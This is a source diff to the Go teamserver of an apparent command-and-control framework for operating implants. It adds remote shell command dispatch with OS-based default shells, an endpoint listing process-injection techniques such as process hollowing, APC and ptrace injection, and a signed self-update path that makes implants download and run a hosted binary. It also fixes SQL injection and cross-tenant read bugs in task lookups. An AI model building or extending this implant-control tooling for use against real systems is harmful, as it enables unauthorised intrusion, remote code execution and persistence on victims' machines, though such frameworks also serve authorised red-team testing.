@@ -2,6 +2,7 @@ package server
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"io"
 	"log/slog"
@@ -14,6 +15,7 @@ import (
 	"time"
 
 	"github.com/forgec2/forgec2/internal/db"
+	"github.com/forgec2/forgec2/internal/payload"
 	"github.com/gin-gonic/gin"
 )
 
@@ -104,21 +106,54 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 	}
 	id := c.Param("id")
 	cmd := c.PostForm("command")
+	shell := c.PostForm("shell")
+	callbackURL := c.PostForm("callback_url")
+	callbackMethod := c.PostForm("callback_method")
+
+	// Fall back to JSON body when form fields are empty (the frontend
+	// postJson helper sends Content-Type: application/json).
+	if cmd == "" || shell == "" {
+		var jb struct {
+			Command        string `json:"command"`
+			Shell          string `json:"shell"`
+			CallbackURL    string `json:"callback_url"`
+			CallbackMethod string `json:"callback_method"`
+		}
+		if err := c.ShouldBindJSON(&jb); err == nil {
+			if cmd == "" {
+				cmd = jb.Command
+			}
+			if shell == "" {
+				shell = jb.Shell
+			}
+			if callbackURL == "" {
+				callbackURL = jb.CallbackURL
+			}
+			if callbackMethod == "" {
+				callbackMethod = jb.CallbackMethod
+			}
+		}
+	}
+
 	if len(cmd) > MaxCommandLength {
 		respondError(c, http.StatusBadRequest, fmt.Sprintf("command too long (max %d characters)", MaxCommandLength))
 		return
 	}
-	shell := c.PostForm("shell")
-	callbackURL := c.PostForm("callback_url")
-	callbackMethod := c.PostForm("callback_method")
-	if shell == "" {
-		shell = "cmd.exe"
-	}
 
 	slog.Debug("HandleSendCommand called", "agent_id", id, "command", truncateString(cmd, 100))
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
+	target, ok := s.getAgentOrFail(c, id)
+	if !ok {
 		return
+	}
+	if shell == "" {
+		// Match the default shell to the target OS — cmd.exe on a Linux
+		// implant just errors out on the agent side.
+		if target.OS != "" && !strings.HasPrefix(strings.ToLower(target.OS), "win") {
+			shell = "/bin/sh"
+		} else {
+			shell = "cmd.exe"
+		}
 	}
 
 	// Validate callback fields BEFORE creating the task so a rejected request
@@ -190,10 +225,18 @@ func (s *Server) handleGetAgentTasks(c *gin.Context) {
 }
 
 func (s *Server) handleGetTaskStatus(c *gin.Context) {
-	taskID := c.Param("taskId")
+	// Parse strictly: GORM treats a raw string condition containing spaces as
+	// SQL, so passing the URL parameter straight into First() allowed
+	// boolean-blind injection ("1 OR 1=1") and cross-tenant reads.
+	taskID, err := strconv.ParseUint(c.Param("taskId"), 10, 64)
+	if err != nil {
+		respondError(c, http.StatusBadRequest, "invalid task id")
+		return
+	}
 
 	var task db.Task
-	if err := s.db.Preload("Agent").First(&task, taskID).Error; err != nil {
+	query := s.tenantScope(s.db.Preload("Agent"), c)
+	if err := query.First(&task, taskID).Error; err != nil {
 		respondError(c, http.StatusNotFound, "task not found")
 		return
 	}
@@ -247,7 +290,9 @@ func (s *Server) handleBatchTaskStatus(c *gin.Context) {
 	}
 
 	var tasks []db.Task
-	if err := s.db.Where("id IN ?", ids).Find(&tasks).Error; err != nil {
+	// Tenant scope mirrors handleGetTaskStatus: without it a tenant-scoped
+	// operator could read other tenants' task Result/Error bodies.
+	if err := s.tenantScope(s.db, c).Where("id IN ?", ids).Find(&tasks).Error; err != nil {
 		slog.Error("Failed to query tasks for batch status", "error", err)
 		respondError(c, http.StatusInternalServerError, "failed to query tasks")
 		return
@@ -830,7 +875,9 @@ func (s *Server) handleCancelTask(c *gin.Context) {
 	}
 
 	var task db.Task
-	if err := s.db.First(&task, taskID).Error; err != nil {
+	// Tenant scope: bind the task to the caller's tenant before the
+	// agent-ownership check (cancel must not touch other tenants' tasks).
+	if err := s.tenantScope(s.db, c).First(&task, taskID).Error; err != nil {
 		respondError(c, http.StatusNotFound, "task not found")
 		return
 	}
@@ -839,21 +886,57 @@ func (s *Server) handleCancelTask(c *gin.Context) {
 		return
 	}
 
-	if task.Status != "pending" && task.Status != "running" {
+	if task.Status != "pending" && task.Status != TaskStatusPendingApproval && task.Status != "running" {
 		respondError(c, http.StatusBadRequest, fmt.Sprintf("task is %s, cannot cancel", task.Status))
 		return
 	}
 
-	wasRunning := task.Status == "running"
+	// Snapshot the pre-cancel status for the conflict message, then flip to
+	// cancelled. wasRunning is decided RACE-FREE by trying the
+	// running→cancelled flip FIRST: each conditional update is atomic, so a
+	// concurrent claim between the two attempts cannot hide a task the agent
+	// already started executing (the old single pre-read snapshot could,
+	// skipping abort injection).
+	priorStatus := task.Status
 
-	if err := s.db.Model(&task).Updates(map[string]interface{}{
-		"status": "cancelled",
-		"error":  "cancelled by operator",
-	}).Error; err != nil {
-		slog.Error("Failed to update task status to cancelled", "agent_id", agentID, "task", taskID, "err", err)
+	wasRunning := false
+	result := s.db.Model(&db.Task{}).
+		Where("id = ? AND status = ?", taskID, "running").
+		Updates(map[string]interface{}{
+			"status": "cancelled",
+			"error":  "cancelled by operator",
+		})
+	if result.Error == nil && result.RowsAffected == 1 {
+		wasRunning = true
+	} else if result.Error == nil {
+		result = s.db.Model(&db.Task{}).
+			Where("id = ? AND status IN ?", taskID, []string{"pending", TaskStatusPendingApproval}).
+			Updates(map[string]interface{}{
+				"status": "cancelled",
+				"error":  "cancelled by operator",
+			})
+	}
+	if result.Error != nil {
+		slog.Error("Failed to update task status to cancelled", "agent_id", agentID, "task", taskID, "err", result.Error)
 		respondError(c, http.StatusInternalServerError, "failed to cancel task")
 		return
 	}
+	if result.RowsAffected == 0 {
+		currentStatus := priorStatus
+		var fresh db.Task
+		if err := s.db.First(&fresh, "id = ?", taskID).Error; err == nil {
+			currentStatus = fresh.Status
+		}
+		respondError(c, http.StatusConflict, fmt.Sprintf("task is now %s, cannot cancel", currentStatus))
+		return
+	}
+
+	task.Status = "cancelled"
+	task.Error = "cancelled by operator"
+
+	// Every non-terminal task occupies a pending-counter slot (reconcile
+	// counts pending + running + pending_approval), so cancelling releases it.
+	s.decPendingTasks(agentID)
 
 	if wasRunning {
 		abortTask := db.Task{
@@ -905,7 +988,9 @@ func (s *Server) handleRerunTask(c *gin.Context) {
 	}
 
 	var original db.Task
-	if err := s.db.First(&original, taskID).Error; err != nil {
+	// Tenant scope (see handleCancelTask): rerun must not source commands
+	// from another tenant's task history.
+	if err := s.tenantScope(s.db, c).First(&original, taskID).Error; err != nil {
 		respondError(c, http.StatusNotFound, "original task not found")
 		return
 	}
@@ -959,6 +1044,20 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 	slog.Info("Execute-assembly requested", "agent_id", id, "assembly", filename, "size", size)
 	s.LogAuditRecord(c, "execute_assembly", "agent", id, fmt.Sprintf("Assembly: %s (%d bytes)", filename, size), true, nil)
 	s.dispatchTask(c, task, "execute_assembly", filename)
+}
+
+// handleInjectMethods returns the injection techniques the agent supports.
+func (s *Server) handleInjectMethods(c *gin.Context) {
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+	methods := map[string][]string{
+		"windows": {"createremotethread", "ntcreatethreadex", "ntcreatethreadex_indirect", "apc", "earlybird", "threadless", "syscall", "indirect", "hollow", "hijack", "atom", "txf", "stomp"},
+		"linux":   {"ptrace", "mem", "process_vm_writev", "ld_preload"},
+		"darwin":  {"ptrace", "task_for_pid"},
+	}
+	c.JSON(http.StatusOK, gin.H{"success": true, "methods": methods})
 }
 
 // 鈹€鈹€ kerberoast: Request TGS hashes for all SPNs 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
@@ -1411,28 +1510,86 @@ func (s *Server) handleSetSleepMaskAdvanced(c *gin.Context) {
 
 // 鈹€鈹€ Self-Update 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
+// handleSelfUpdate dispatches a SIGNED self-update envelope. The implant
+// pins the build-time update key and refuses anything it cannot verify, so
+// the operator must supply the SHA-256 of the hosted binary; the teamserver
+// signs that digest with its private half and ships the envelope
+// {url, signature} to the agent.
+//
+// POST /agents/:id/self_update   url=... & sha256=<64 hex>
 func (s *Server) handleSelfUpdate(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
 	}
 	id := c.Param("id")
-	url := c.PostForm("url")
+	url := strings.TrimSpace(c.PostForm("url"))
+	shaHex := strings.ToLower(strings.TrimSpace(c.PostForm("sha256")))
 	if url == "" {
 		respondError(c, http.StatusBadRequest, "download URL is required")
+		return
+	}
+	if shaHex == "" {
+		respondError(c, http.StatusBadRequest,
+			"sha256 of the hosted binary is required (self_update is signature-enforced)")
+		return
+	}
+	signature, err := payload.SignUpdateHash(shaHex)
+	if err != nil {
+		slog.Warn("Failed to sign update hash", "agent_id", id, "error", err)
+		respondError(c, http.StatusBadRequest, sanitizeError(err, "update signing"))
 		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
-	task, err := s.createTask(id, "self_update", url, "", "", "", 0, 0)
+
+	envelope, err := json.Marshal(map[string]string{"url": url, "signature": signature})
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, "failed to encode update command")
+		return
+	}
+	task, err := s.createTask(id, "self_update", string(envelope), "", "", "", 0, 0)
 	if err != nil {
 		slog.Error("Failed to create self_update task", "agent_id", id, "error", err)
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
-	slog.Info("Self-update requested", "agent_id", id, "url", url)
-	s.LogAuditRecord(c, "self_update", "agent", id, "Self-update: "+url, true, nil)
+	sigShort := signature[:16] + "…"
+	slog.Info("Self-update requested", "agent_id", id, "url", url, "sig", sigShort)
+	s.LogAuditRecord(c, "self_update", "agent", id,
+		"Self-update: "+url+" sig="+sigShort, true, nil)
 	s.dispatchTask(c, task, "self_update", "Self-Update ("+url+")")
+}
+
+// handleUpdateSigningKey exposes the public half of the update-signing key so
+// external tooling can verify or pre-sign updates. Admin-only: the public key
+// reveals which builds accept updates.
+// GET /api/update-signing/public-key
+func (s *Server) handleUpdateSigningKey(c *gin.Context) {
+	pubHex, err := payload.UpdateSigningPublicKeyHex()
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, sanitizeError(err, "update signing"))
+		return
+	}
+	respond(c, gin.H{"success": true, "public_key": pubHex})
+}
+
+// handleSignUpdate signs an externally computed SHA-256 digest. Admin-only:
+// a valid signature authorises code execution on every pinned implant.
+// POST /api/update-signing/sign   sha256=<64 hex>
+func (s *Server) handleSignUpdate(c *gin.Context) {
+	shaHex := strings.ToLower(strings.TrimSpace(c.PostForm("sha256")))
+	if shaHex == "" {
+		shaHex = strings.ToLower(strings.TrimSpace(c.Query("sha256")))
+	}
+	sig, err := payload.SignUpdateHash(shaHex)
+	if err != nil {
+		respondError(c, http.StatusBadRequest, sanitizeError(err, "update signing"))
+		return
+	}
+	s.LogAuditRecord(c, "sign_update", "system", "",
+		"signed update digest "+shaHex, true, nil)
+	respond(c, gin.H{"success": true, "sha256": shaHex, "signature": sig})
 }
 
 // simpleTaskDef defines a basic task with no extra parameters
